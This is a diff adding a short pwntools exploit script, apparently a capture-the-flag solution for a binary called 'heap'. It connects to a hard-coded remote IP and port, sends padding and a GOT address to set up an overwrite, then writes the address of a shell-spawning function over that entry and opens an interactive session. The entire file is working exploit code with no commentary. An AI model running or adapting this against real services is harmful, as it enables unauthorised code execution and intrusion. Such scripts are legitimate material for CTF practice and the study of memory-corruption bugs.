@@ -1,0 +1,23 @@
+#!/usr/bin/env python
+
+from pwn import *
+import sys
+
+# p = process("./heap")
+p = remote("103.200.7.156", 2103)
+
+padding = 0
+got = 0x804a020
+sys = 0x080485cb
+
+payload = ''
+payload += 'A'*20
+payload += p32(got)
+# print payload
+p.sendline(payload)
+
+payload = p32(sys)
+# print payload
+p.sendline(payload)
+
+p.interactive()
